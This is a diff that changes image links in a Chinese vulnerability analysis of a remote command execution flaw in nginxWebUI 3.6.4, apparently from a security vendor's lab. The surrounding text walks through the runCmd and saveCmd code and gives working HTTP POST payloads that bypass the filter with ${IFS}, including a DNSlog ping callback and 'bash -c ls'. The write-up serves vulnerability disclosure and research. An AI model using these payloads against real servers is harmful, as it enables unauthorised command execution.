@@ -72,7 +72,7 @@ nginxWebUI runCmd 远程命令执行漏洞时间线：
 
 目前已跟进版本：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhHu02Ob6NzEPgRfZPpd2I0TxDX7yLu249vyA4pu3iaHsXbnJljoibPhQQ/640?wx_fmt=png)
+![](../../.resource/remote/d5749bf3528715b645c3e357ea8039f5b72eb6f95c104494533cea68d68e8f49.png)
 
 3.4.7-3.6.3 版本代码分析参考上一篇。
 
@@ -82,19 +82,19 @@ nginxWebUI runCmd 远程命令执行漏洞时间线：
 
 定位到命令执行接口：\nginxWebUI-3.6.4\src\main\java\com\cym\controller\adminPage\ConfController.java 330 行
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqh9kZ1g8UyVWXjzZDrFooibPrkDpOocc1IGVicWsbDJVZ1eCjQks7kicMHQ/640?wx_fmt=png)
+![](../../.resource/remote/a7d313447f9975012c270b81dff5ddefcc4a6761274fbe06e9fed3aba517231d.png)
 
 在这里 runcmd 接收 2 个参数：cmd 和 type。先检查 type 是否为空，不为空则调用 settingService.set(type, cmd) 使用配置文件的相关配置：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhicDF0ej4H5MP2o6HtabGwH6gokqO5HDib7PMPlU7PZKiaY2DpRQ7W0kow/640?wx_fmt=png)
+![](../../.resource/remote/4ddbd7706413d1b632e8d99702b899da98d7404fe26a93b5ebc29950d85aef5b.png)
 
 然后使用了 if (!isAvailableCmd(cmd)) ，检查 cmd 是否为有效的命令
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhEUfCiaavKusgNDsCiclENica3ibgiaH8L99A6vLzOpx5jkI1BTfqCkaJQzg/640?wx_fmt=png)
+![](../../.resource/remote/9802e45c5445c751cbe866a25bf91e885e025def3d76ce3706894a75390bdd59.png)
 
 跟一下! isAvailableCmd：366 行
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhuzeo9OibAibSWdJgMnzVwib15ZFhq5JJQ21mk3co6sg6gcaianpOctC0qg/640?wx_fmt=png)
+![](../../.resource/remote/7d8c75c5371ef9f3a4051b445e765c6fe2d8161c10cd2764dc0cbedeece43bb3.png)
 
 一个布尔类型私有方法，检查 cmd 参数是否有效，过滤了获取的所有路径，检查命令是否属于以下命令：
 
@@ -119,11 +119,11 @@ nginxWebUI runCmd 远程命令执行漏洞时间线：
 
 随后回到 runcmd 方法：然后是一个判断系统为 win 或者 linux，调用不同的系统命令。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhH4pibJKnqJhHgicawcxp48ZITwMlK8KovO8GZhMhPRY8miap5a2hz0p1w/640?wx_fmt=png)
+![](../../.resource/remote/48dea5bb3ee38fe4da1ea9ae7761b294ab5fb38d2dee399c99025089b622dec1.png)
 
 然后对结果进行非空判断和内容正则。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhEbNP4ny9v5nhKUpCx7Q6181VqQDAcsBM3hOrvlcMU48GYqvvhHqIMQ/640?wx_fmt=png)
+![](../../.resource/remote/1dfa798bdc24ff3bf1fbaf8cb5373de6187fed170f4a341c03f691c51fb47d41.png)
 
 **3.6.4 漏洞构造**
 
@@ -133,11 +133,11 @@ nginxWebUI runCmd 远程命令执行漏洞时间线：
 
 我们找到了处理这两个参数的 saveCmd 方法：272 行
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhlEPUZn3paJROQUvWN26E2h2fib3Hf2vw4e8K2L1Krt4HIwZlg2zYT6w/640?wx_fmt=png)
+![](../../.resource/remote/45f2f8806308b26ae598c98d213fbcf45e991cce90180c1f9b7012d4ae4087dc.png)
 
 该方法接收三个参数 nginxPath、nginxExe 和 nginxDir，在方法内部调用 ToolUtils.handlePath 进行过滤处理，即黑名单的方式对以下空格和符号进行转义替换。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhWTyIkusWVFWjJpcqhia8cFKQYnKwtNVgSkYMIKhcGmnys55fCqxx21w/640?wx_fmt=png)
+![](../../.resource/remote/c3281a734ee92e2be8a4e6e1e4e526bfc8501219cd02f5fe032b2ba60eec7138.png)
 
 **尝试绕过**
 
@@ -145,15 +145,15 @@ nginxWebUI runCmd 远程命令执行漏洞时间线：
 
 在 linux 下，linux 把 ${IFS} 会被当做空格：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhMwgkB01ia0QfZRhcCIWRIqehR3pOoOmZCIIzlKe9ppClOAPbibenBgog/640?wx_fmt=png)
+![](../../.resource/remote/a93e9b948b552ba5dc1e046cdec72066ba28e5db6da0f4cedd8c6d623519ea6f.png)
 
 访问 nginxweibui
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhHG8Z4HyDJcVrUwtiagWJ3bPlgfyJKmt4QuWd4kwT6riaeC48msFhsEUA/640?wx_fmt=png)
+![](../../.resource/remote/e63bbeb6234c8aab0614d6ce89c181d62362a4689c623c40863a2b0f4ece0d49.png)
 
 配置 nginxExe 参数：即将 isAvailableCmd 中的 nginxExe 预设成我们将要执行的命令。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhv0GsArwibIUp5Xvg1gtoCL7XhStM4G9QzPpvRMFmPzicaDRV8ROlicumw/640?wx_fmt=png)
+![](../../.resource/remote/6c778e2f94d8419262d63eb9374d4d70791d3a7d040f65a98bfab1876ca15700.png)
 
 ```http
 POST /adminPage/conf/saveCmd HTTP/1.1
@@ -176,7 +176,7 @@ nginxExe=ping${IFS}22dck7.dnslog.cn&nginxPath=1
 
 命令执行：
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhRBAq4847uhsQk45eJyg9iaXXmYMRYY3HgaVkmr0I1icIRianb3fpuyE1Q/640?wx_fmt=png)
+![](../../.resource/remote/0217805ff7cdfac665b10b108c22f768920f08b9da0b6e30a57396f6138b61a2.png)
 
 ```http
 POST /adminPage/conf/runCmd HTTP/1.1
@@ -199,7 +199,7 @@ cmd=ping${IFS}22dck7.dnslog.cn -c 1
 
 Dnslog 返回成功。
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhylofesLwhwgZAhLTJ09bEdlibNOQ33aWqCx0gKxC2bJmEGNhlPBBmNQ/640?wx_fmt=png)
+![](../../.resource/remote/71f6fe23f24e6ca855053f317c409aa27400f138c8f657818b25fce99e988449.png)
 
 其他命令：
 
@@ -215,7 +215,7 @@ cmd=bash${IFS} -c ls
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/C6nwdaicQKwWT4HLCv7hz9cCjEYLXqWZJayhCdh0Ix1GdDpSicv8wAlW178gA8TSndNp9mZcsYGr6ubhibS8Odomg/640?wx_fmt=gif)
+![](../../.resource/remote/befb55e040df68ec079383beef415ed19583ed05a9b36f421784322d5631b424.gif)
 
 美创科技旗下第 59 号实验室，专注于数据安全技术领域研究，聚焦于安全防御理念、攻防技术、威胁情报等专业研究，进行知识产权转化并赋能于产品。累计向 CNVD、CNNVD 等平台提报数百个高质量原创漏洞，发明专利数十篇，团队著有《数据安全实践指南》
 
